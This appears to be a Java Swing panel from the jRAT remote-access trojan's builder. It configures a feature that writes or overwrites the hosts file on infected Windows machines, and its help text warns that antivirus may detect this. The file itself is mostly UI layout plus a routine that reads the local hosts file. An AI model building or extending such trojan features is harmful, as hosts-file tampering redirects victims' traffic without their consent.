package se.jrat.controller.ui.panels;

import iconlib.IconUtils;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;

import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JEditorPane;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JToggleButton;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.ScrollPaneConstants;

import se.jrat.controller.ErrorDialog;
import se.jrat.controller.Help;

import com.redpois0n.oslib.OperatingSystem;


@SuppressWarnings("serial")
public class PanelBuildHostFile extends JPanel {
	
	private JEditorPane editorPane;
	private JToggleButton tglbtnOverwrite;
	private JCheckBox chckbxEnable;

	public boolean enabled() {
		return chckbxEnable.isSelected();
	}

	public String getText() {
		return editorPane.getText();
	}

	public boolean overwrite() {
		return tglbtnOverwrite.isSelected();
	}

	public PanelBuildHostFile() {
		JScrollPane scrollPane = new JScrollPane();
		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
		scrollPane.setHorizontalScrollBarPolicy(ScrollPaneConstants.HORIZONTAL_SCROLLBAR_ALWAYS);

		JButton btnGetLocalHost = new JButton("Get local host file");
		btnGetLocalHost.setIcon(IconUtils.getIcon("leaf-arrow"));
		btnGetLocalHost.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
					try {
						File file = null;
						
						if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
							file = new File(System.getenv("SystemDrive") + "\\Windows\\System32\\drivers\\etc\\hosts");
						} else if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.OSX) {
							file = new File("/private/etc/hosts");
						} else {
							file = new File("/etc/hosts");
						}
						
						BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(file)));
						String str;
						String host = "";
						while ((str = reader.readLine()) != null) {
							host += str + "\n";
						}
						reader.close();
						editorPane.setText(host);
					} catch (Exception ex) {
						ex.printStackTrace();
						ErrorDialog.create(ex);
					}
				} else {
					JOptionPane.showMessageDialog(null, "Can only get host file on windows", "Error", JOptionPane.ERROR_MESSAGE);
				}
			}
		});

		tglbtnOverwrite = new JToggleButton("Overwrite");
		tglbtnOverwrite.setIcon(IconUtils.getIcon("leaf-minus"));
		tglbtnOverwrite.setSelected(true);

		JButton button = new JButton("");
		button.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				Help.help("Will write the host file on windows computers.\nNOTE: Some AV's might catch the writing of the hosts file");
			}
		});
		button.setIcon(IconUtils.getIcon("help"));

		chckbxEnable = new JCheckBox("Enable");

		JLabel label = new JLabel("");
		label.setIcon(IconUtils.getIcon("leaf-plus"));
		GroupLayout groupLayout = new GroupLayout(this);
		groupLayout.setHorizontalGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(groupLayout.createSequentialGroup().addGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(groupLayout.createSequentialGroup().addContainerGap().addGroup(groupLayout.createParallelGroup(Alignment.LEADING).addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 429, GroupLayout.PREFERRED_SIZE).addGroup(groupLayout.createSequentialGroup().addComponent(btnGetLocalHost).addPreferredGap(ComponentPlacement.RELATED).addComponent(tglbtnOverwrite).addPreferredGap(ComponentPlacement.RELATED).addComponent(button)))).addGroup(groupLayout.createSequentialGroup().addGap(14).addComponent(label).addPreferredGap(ComponentPlacement.RELATED).addComponent(chckbxEnable))).addContainerGap(11, Short.MAX_VALUE)));
		groupLayout.setVerticalGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(groupLayout.createSequentialGroup().addGap(11).addGroup(groupLayout.createParallelGroup(Alignment.LEADING, false).addComponent(label, GroupLayout.DEFAULT_SIZE, GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE).addComponent(chckbxEnable, GroupLayout.DEFAULT_SIZE, GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)).addPreferredGap(ComponentPlacement.UNRELATED).addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 210, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.UNRELATED).addGroup(groupLayout.createParallelGroup(Alignment.BASELINE).addComponent(btnGetLocalHost).addComponent(tglbtnOverwrite).addComponent(button)).addContainerGap(13, Short.MAX_VALUE)));

		editorPane = new JEditorPane();
		scrollPane.setViewportView(editorPane);
		setLayout(groupLayout);

	}
}
